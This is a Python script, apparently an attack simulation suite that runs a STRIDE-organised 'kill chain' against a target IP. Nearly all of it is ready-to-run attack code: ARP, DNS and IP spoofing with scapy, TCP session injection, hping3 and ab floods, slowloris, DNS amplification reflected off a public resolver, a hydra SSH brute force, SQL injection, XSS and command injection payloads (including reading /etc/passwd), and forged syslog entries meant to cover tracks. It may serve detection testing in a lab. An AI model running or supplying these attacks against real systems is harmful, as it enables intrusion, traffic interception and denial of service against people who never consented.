#!/usr/bin/env python3
"""
Comprehensive Attack Simulation Suite
Covers all STRIDE threat categories with realistic scenarios
"""

import subprocess
import time
import json
import random
import string
import socket
import struct
from datetime import datetime
from scapy.all import *
import requests

class ComprehensiveAttackSuite:
    def __init__(self, target_ip, attacker_ip="10.0.0.100"):
        self.target = target_ip
        self.attacker = attacker_ip
        self.log_file = f"attacks_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.attack_log = []
        
    def log_attack(self, attack_type, category, details, success):
        """Log attack with structured data"""
        entry = {
            'timestamp': time.time(),
            'datetime': datetime.now().isoformat(),
            'attack_type': attack_type,
            'stride_category': category,
            'target': self.target,
            'attacker': self.attacker,
            'details': details,
            'success': success
        }
        self.attack_log.append(entry)
        print(f"\n[{entry['datetime']}] {attack_type} - {category}")
        print(f"Details: {json.dumps(details, indent=2)}")
        
        with open(self.log_file, 'w') as f:
            json.dump(self.attack_log, f, indent=2)
    
    # ==================== SPOOFING ATTACKS ====================
    
    def arp_spoofing(self, gateway="10.0.0.254", duration=30):
        """ARP Cache Poisoning (MITM)"""
        print("\n[+] Executing ARP Spoofing Attack...")
        try:
            # Create malicious ARP packets
            victim_mac = getmacbyip(self.target)
            gateway_mac = getmacbyip(gateway)
            
            if not victim_mac or not gateway_mac:
                self.log_attack("ARP Spoofing", "Spoofing", 
                              {"error": "Could not resolve MAC addresses"}, False)
                return
            
            # Poison victim's ARP cache
            poison_target = ARP(op=2, psrc=gateway, pdst=self.target, 
                              hwdst=victim_mac)
            # Poison gateway's ARP cache
            poison_gateway = ARP(op=2, psrc=self.target, pdst=gateway, 
                               hwdst=gateway_mac)
            
            start_time = time.time()
            packets_sent = 0
            
            while time.time() - start_time < duration:
                send(poison_target, verbose=False)
                send(poison_gateway, verbose=False)
                packets_sent += 2
                time.sleep(2)
            
            # Restore ARP tables
            restore_target = ARP(op=2, psrc=gateway, hwsrc=gateway_mac,
                               pdst=self.target, hwdst=victim_mac)
            restore_gateway = ARP(op=2, psrc=self.target, hwsrc=victim_mac,
                                pdst=gateway, hwdst=gateway_mac)
            send(restore_target, count=5, verbose=False)
            send(restore_gateway, count=5, verbose=False)
            
            self.log_attack("ARP Spoofing", "Spoofing", {
                "duration": duration,
                "packets_sent": packets_sent,
                "victim": self.target,
                "gateway": gateway
            }, True)
            
        except Exception as e:
            self.log_attack("ARP Spoofing", "Spoofing", {"error": str(e)}, False)
    
    def ip_spoofing(self, spoofed_src="192.168.1.100", count=100):
        """IP Address Spoofing"""
        print("\n[+] Executing IP Spoofing Attack...")
        try:
            for i in range(count):
                # Create packet with spoofed source IP
                packet = IP(src=spoofed_src, dst=self.target)/ICMP()
                send(packet, verbose=False)
            
            self.log_attack("IP Spoofing", "Spoofing", {
                "spoofed_source": spoofed_src,
                "packets_sent": count
            }, True)
            
        except Exception as e:
            self.log_attack("IP Spoofing", "Spoofing", {"error": str(e)}, False)
    
    def dns_spoofing(self, fake_domain="malicious.com", fake_ip="6.6.6.6"):
        """DNS Cache Poisoning"""
        print("\n[+] Executing DNS Spoofing Attack...")
        try:
            # Craft fake DNS response
            dns_response = IP(dst=self.target, src="8.8.8.8")/\
                          UDP(dport=RandShort(), sport=53)/\
                          DNS(id=RandShort(), qr=1, aa=1, qd=DNSQR(qname=fake_domain),
                              an=DNSRR(rrname=fake_domain, ttl=10, rdata=fake_ip))
            
            send(dns_response, count=50, verbose=False)
            
            self.log_attack("DNS Spoofing", "Spoofing", {
                "fake_domain": fake_domain,
                "fake_ip": fake_ip,
                "dns_server": "8.8.8.8"
            }, True)
            
        except Exception as e:
            self.log_attack("DNS Spoofing", "Spoofing", {"error": str(e)}, False)
    
    def mac_spoofing(self, fake_mac="00:11:22:33:44:55"):
        """MAC Address Spoofing"""
        print("\n[+] Executing MAC Spoofing Attack...")
        try:
            # Send packets with spoofed MAC
            packet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")/\
                    IP(dst=self.target)/ICMP()
            sendp(packet, count=50, verbose=False)
            
            self.log_attack("MAC Spoofing", "Spoofing", {
                "spoofed_mac": fake_mac
            }, True)
            
        except Exception as e:
            self.log_attack("MAC Spoofing", "Spoofing", {"error": str(e)}, False)
    
    # ==================== TAMPERING ATTACKS ====================
    
    def packet_injection(self, malicious_payload="MALICIOUS_DATA"):
        """Packet Tampering/Injection"""
        print("\n[+] Executing Packet Injection Attack...")
        try:
            # Inject malicious packets into stream
            packet = IP(dst=self.target)/TCP(dport=80, flags="PA")/\
                    Raw(load=malicious_payload)
            send(packet, count=20, verbose=False)
            
            self.log_attack("Packet Injection", "Tampering", {
                "payload": malicious_payload,
                "target_port": 80
            }, True)
            
        except Exception as e:
            self.log_attack("Packet Injection", "Tampering", 
                          {"error": str(e)}, False)
    
    def session_hijacking(self, target_port=22):
        """TCP Session Hijacking Attempt"""
        print("\n[+] Executing Session Hijacking Attack...")
        try:
            # Attempt to inject into existing session
            packet = IP(dst=self.target)/TCP(dport=target_port, 
                      flags="PA", seq=1000000)/Raw(load="hijacked")
            send(packet, count=10, verbose=False)
            
            self.log_attack("Session Hijacking", "Tampering", {
                "target_port": target_port,
                "injection_attempts": 10
            }, True)
            
        except Exception as e:
            self.log_attack("Session Hijacking", "Tampering", 
                          {"error": str(e)}, False)
    
    # ==================== REPUDIATION ATTACKS ====================
    
    def log_poisoning(self):
        """Attempt to inject false log entries"""
        print("\n[+] Executing Log Poisoning Attack...")
        try:
            # Send crafted packets to confuse logging systems
            fake_logs = [
                "Success: User admin logged in from 10.0.0.1",
                "Error: Failed to block legitimate traffic",
                "Info: Security system disabled temporarily"
            ]
            
            for log_entry in fake_logs:
                packet = IP(dst=self.target)/TCP(dport=514)/Raw(load=log_entry)
                send(packet, verbose=False)
            
            self.log_attack("Log Poisoning", "Repudiation", {
                "fake_entries": len(fake_logs)
            }, True)
            
        except Exception as e:
            self.log_attack("Log Poisoning", "Repudiation", 
                          {"error": str(e)}, False)
    
    def timestamp_manipulation(self):
        """Timestamp Manipulation Attempt"""
        print("\n[+] Executing Timestamp Manipulation...")
        try:
            # Send packets with manipulated timestamps
            past_time = time.time() - 86400  # 24 hours ago
            packet = IP(dst=self.target)/TCP(dport=80)/\
                    Raw(load=f"timestamp:{past_time}")
            send(packet, count=10, verbose=False)
            
            self.log_attack("Timestamp Manipulation", "Repudiation", {
                "manipulated_timestamp": past_time
            }, True)
            
        except Exception as e:
            self.log_attack("Timestamp Manipulation", "Repudiation", 
                          {"error": str(e)}, False)
    
    # ==================== INFORMATION DISCLOSURE ====================
    
    def nmap_comprehensive_scan(self):
        """Comprehensive Nmap Reconnaissance"""
        print("\n[+] Executing Comprehensive Nmap Scan...")
        try:
            scan_types = [
                ("TCP SYN Scan", "nmap -sS -T4"),
                ("Service Version", "nmap -sV"),
                ("OS Detection", "nmap -O"),
                ("Script Scan", "nmap -sC"),
                ("Aggressive Scan", "nmap -A")
            ]
            
            results = {}
            for scan_name, cmd in scan_types:
                full_cmd = f"{cmd} {self.target}"
                result = subprocess.run(full_cmd, shell=True, 
                                      capture_output=True, timeout=60)
                results[scan_name] = "executed"
            
            self.log_attack("Nmap Reconnaissance", "Information Disclosure", {
                "scan_types": list(results.keys())
            }, True)
            
        except Exception as e:
            self.log_attack("Nmap Reconnaissance", "Information Disclosure", 
                          {"error": str(e)}, False)
    
    def banner_grabbing(self, ports=[21, 22, 23, 25, 80, 443]):
        """Service Banner Grabbing"""
        print("\n[+] Executing Banner Grabbing...")
        banners = {}
        try:
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, port))
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    banners[port] = banner[:100]
                    sock.close()
                except:
                    pass
            
            self.log_attack("Banner Grabbing", "Information Disclosure", {
                "ports_scanned": ports,
                "banners_found": len(banners)
            }, True)
            
        except Exception as e:
            self.log_attack("Banner Grabbing", "Information Disclosure", 
                          {"error": str(e)}, False)
    
    def network_sniffing(self, duration=30):
        """Passive Network Sniffing"""
        print(f"\n[+] Executing Network Sniffing ({duration}s)...")
        try:
            packets = sniff(timeout=duration, count=100)
            
            protocols = {}
            for pkt in packets:
                if IP in pkt:
                    proto = pkt[IP].proto
                    protocols[proto] = protocols.get(proto, 0) + 1
            
            self.log_attack("Network Sniffing", "Information Disclosure", {
                "duration": duration,
                "packets_captured": len(packets),
                "protocols": protocols
            }, True)
            
        except Exception as e:
            self.log_attack("Network Sniffing", "Information Disclosure", 
                          {"error": str(e)}, False)
    
    # ==================== DENIAL OF SERVICE ====================
    
    def syn_flood(self, duration=30, rate=1000):
        """SYN Flood Attack"""
        print(f"\n[+] Executing SYN Flood ({duration}s at {rate} pps)...")
        try:
            cmd = f"timeout {duration} hping3 -S -p 80 --flood --rand-source {self.target}"
            subprocess.run(cmd, shell=True)
            
            self.log_attack("SYN Flood", "Denial of Service", {
                "duration": duration,
                "rate": rate,
                "target_port": 80
            }, True)
            
        except Exception as e:
            self.log_attack("SYN Flood", "Denial of Service", 
                          {"error": str(e)}, False)
    
    def udp_flood(self, duration=30):
        """UDP Flood Attack"""
        print(f"\n[+] Executing UDP Flood ({duration}s)...")
        try:
            cmd = f"timeout {duration} hping3 --udp -p 53 --flood {self.target}"
            subprocess.run(cmd, shell=True)
            
            self.log_attack("UDP Flood", "Denial of Service", {
                "duration": duration,
                "target_port": 53
            }, True)
            
        except Exception as e:
            self.log_attack("UDP Flood", "Denial of Service", 
                          {"error": str(e)}, False)
    
    def icmp_flood(self, duration=30):
        """ICMP Flood (Ping Flood)"""
        print(f"\n[+] Executing ICMP Flood ({duration}s)...")
        try:
            cmd = f"timeout {duration} hping3 --icmp --flood {self.target}"
            subprocess.run(cmd, shell=True)
            
            self.log_attack("ICMP Flood", "Denial of Service", {
                "duration": duration
            }, True)
            
        except Exception as e:
            self.log_attack("ICMP Flood", "Denial of Service", 
                          {"error": str(e)}, False)
    
    def slowloris(self, connections=200, duration=60):
        """Slowloris Application-Layer DDoS"""
        print(f"\n[+] Executing Slowloris Attack...")
        try:
            cmd = f"timeout {duration} slowhttptest -c {connections} -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://{self.target}/ -x 24 -p 3"
            subprocess.run(cmd, shell=True)
            
            self.log_attack("Slowloris", "Denial of Service", {
                "connections": connections,
                "duration": duration
            }, True)
            
        except Exception as e:
            self.log_attack("Slowloris", "Denial of Service", 
                          {"error": str(e)}, False)
    
    def http_flood(self, duration=30):
        """HTTP GET/POST Flood"""
        print(f"\n[+] Executing HTTP Flood...")
        try:
            cmd = f"timeout {duration} ab -n 100000 -c 1000 http://{self.target}/"
            subprocess.run(cmd, shell=True)
            
            self.log_attack("HTTP Flood", "Denial of Service", {
                "duration": duration,
                "concurrent_connections": 1000
            }, True)
            
        except Exception as e:
            self.log_attack("HTTP Flood", "Denial of Service", 
                          {"error": str(e)}, False)
    
    def amplification_attack(self):
        """DNS/NTP Amplification Attack"""
        print("\n[+] Executing Amplification Attack...")
        try:
            # DNS amplification
            packet = IP(src=self.target, dst="8.8.8.8")/\
                    UDP(sport=RandShort(), dport=53)/\
                    DNS(rd=1, qd=DNSQR(qname=".", qtype="ANY"))
            send(packet, count=100, verbose=False)
            
            self.log_attack("DNS Amplification", "Denial of Service", {
                "amplification_factor": "~70x",
                "packets_sent": 100
            }, True)
            
        except Exception as e:
            self.log_attack("DNS Amplification", "Denial of Service", 
                          {"error": str(e)}, False)
    
    # ==================== ELEVATION OF PRIVILEGE ====================
    
    def brute_force_ssh(self, username="admin", wordlist=None):
        """SSH Brute Force Attack"""
        print("\n[+] Executing SSH Brute Force...")
        try:
            if not wordlist:
                # Common passwords for demo
                passwords = ["admin", "password", "123456", "root", "toor"]
            else:
                with open(wordlist) as f:
                    passwords = [line.strip() for line in f][:20]
            
            cmd = f"hydra -l {username} -P - ssh://{self.target} -t 4"
            
            # Create temporary password file
            with open('/tmp/passwords.txt', 'w') as f:
                f.write('\n'.join(passwords))
            
            result = subprocess.run(
                f"hydra -l {username} -P /tmp/passwords.txt ssh://{self.target} -t 4",
                shell=True, capture_output=True, timeout=60
            )
            
            self.log_attack("SSH Brute Force", "Elevation of Privilege", {
                "username": username,
                "passwords_tried": len(passwords)
            }, True)
            
        except Exception as e:
            self.log_attack("SSH Brute Force", "Elevation of Privilege", 
                          {"error": str(e)}, False)
    
    def sql_injection(self, url=None):
        """SQL Injection Attack"""
        print("\n[+] Executing SQL Injection...")
        try:
            if not url:
                url = f"http://{self.target}/login.php"
            
            payloads = [
                "' OR '1'='1",
                "admin'--",
                "' OR '1'='1' /*",
                "1' UNION SELECT NULL--",
                "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
            ]
            
            for payload in payloads:
                try:
                    requests.get(url, params={'id': payload}, timeout=2)
                except:
                    pass
            
            self.log_attack("SQL Injection", "Elevation of Privilege", {
                "url": url,
                "payloads_tested": len(payloads)
            }, True)
            
        except Exception as e:
            self.log_attack("SQL Injection", "Elevation of Privilege", 
                          {"error": str(e)}, False)
    
    def xss_attack(self, url=None):
        """Cross-Site Scripting (XSS) Attack"""
        print("\n[+] Executing XSS Attack...")
        try:
            if not url:
                url = f"http://{self.target}/search"
            
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            
            for payload in payloads:
                try:
                    requests.get(url, params={'q': payload}, timeout=2)
                except:
                    pass
            
            self.log_attack("XSS Attack", "Elevation of Privilege", {
                "url": url,
                "payloads_tested": len(payloads)
            }, True)
            
        except Exception as e:
            self.log_attack("XSS Attack", "Elevation of Privilege", 
                          {"error": str(e)}, False)
    
    def command_injection(self, url=None):
        """OS Command Injection"""
        print("\n[+] Executing Command Injection...")
        try:
            if not url:
                url = f"http://{self.target}/ping"
            
            payloads = [
                "; cat /etc/passwd",
                "| ls -la",
                "&& whoami",
                "`id`",
                "$(uname -a)"
            ]
            
            for payload in payloads:
                try:
                    requests.get(url, params={'host': payload}, timeout=2)
                except:
                    pass
            
            self.log_attack("Command Injection", "Elevation of Privilege", {
                "url": url,
                "payloads_tested": len(payloads)
            }, True)
            
        except Exception as e:
            self.log_attack("Command Injection", "Elevation of Privilege", 
                          {"error": str(e)}, False)
    
    # ==================== ATTACK SCENARIOS ====================
    
    def reconnaissance_phase(self):
        """Phase 1: Reconnaissance"""
        print("\n" + "="*60)
        print("PHASE 1: RECONNAISSANCE")
        print("="*60)
        
        self.nmap_comprehensive_scan()
        time.sleep(5)
        self.banner_grabbing()
        time.sleep(5)
        self.network_sniffing(duration=15)
    
    def initial_access_phase(self):
        """Phase 2: Initial Access Attempts"""
        print("\n" + "="*60)
        print("PHASE 2: INITIAL ACCESS")
        print("="*60)
        
        self.brute_force_ssh()
        time.sleep(5)
        self.sql_injection()
        time.sleep(5)
        self.xss_attack()
    
    def privilege_escalation_phase(self):
        """Phase 3: Privilege Escalation"""
        print("\n" + "="*60)
        print("PHASE 3: PRIVILEGE ESCALATION")
        print("="*60)
        
        self.command_injection()
        time.sleep(5)
    
    def lateral_movement_phase(self):
        """Phase 4: Lateral Movement"""
        print("\n" + "="*60)
        print("PHASE 4: LATERAL MOVEMENT")
        print("="*60)
        
        self.arp_spoofing(duration=15)
        time.sleep(5)
        self.session_hijacking()
    
    def data_exfiltration_phase(self):
        """Phase 5: Data Exfiltration (simulated)"""
        print("\n" + "="*60)
        print("PHASE 5: DATA EXFILTRATION")
        print("="*60)
        
        self.network_sniffing(duration=20)
    
    def denial_of_service_phase(self):
        """Phase 6: Denial of Service"""
        print("\n" + "="*60)
        print("PHASE 6: DENIAL OF SERVICE")
        print("="*60)
        
        self.syn_flood(duration=15)
        time.sleep(5)
        self.udp_flood(duration=15)
        time.sleep(5)
        self.http_flood(duration=15)
    
    def cover_tracks_phase(self):
        """Phase 7: Cover Tracks"""
        print("\n" + "="*60)
        print("PHASE 7: COVER TRACKS")
        print("="*60)
        
        self.log_poisoning()
        time.sleep(5)
        self.timestamp_manipulation()
    
    def run_complete_attack_chain(self):
        """Execute complete cyber kill chain"""
        print("\n" + "="*80)
        print("EXECUTING COMPLETE CYBER KILL CHAIN")
        print("="*80)
        
        phases = [
            self.reconnaissance_phase,
            self.initial_access_phase,
            self.privilege_escalation_phase,
            self.lateral_movement_phase,
            self.data_exfiltration_phase,
            self.denial_of_service_phase,
            self.cover_tracks_phase
        ]
        
        for phase in phases:
            phase()
            time.sleep(10)  # Pause between phases
        
        print("\n" + "="*80)
        print("ATTACK CHAIN COMPLETED")
        print(f"Total attacks logged: {len(self.attack_log)}")
        print(f"Log file: {self.log_file}")
        print("="*80)


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Comprehensive Attack Simulator')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--attacker', default='10.0.0.100', help='Attacker IP')
    parser.add_argument('--scenario', choices=[
        'recon', 'access', 'escalation', 'lateral', 'exfil', 'dos', 'cover', 'full'
    ], default='full', help='Attack scenario to run')
    
    args = parser.parse_args()
    
    suite = ComprehensiveAttackSuite(args.target, args.attacker)
    
    scenario_map = {
        'recon': suite.reconnaissance_phase,
        'access': suite.initial_access_phase,
        'escalation': suite.privilege_escalation_phase,
        'lateral': suite.lateral_movement_phase,
        'exfil': suite.data_exfiltration_phase,
        'dos': suite.denial_of_service_phase,
        'cover': suite.cover_tracks_phase,
        'full': suite.run_complete_attack_chain
    }
    
    scenario_map[args.scenario]()

if __name__ == "__main__":
    main()
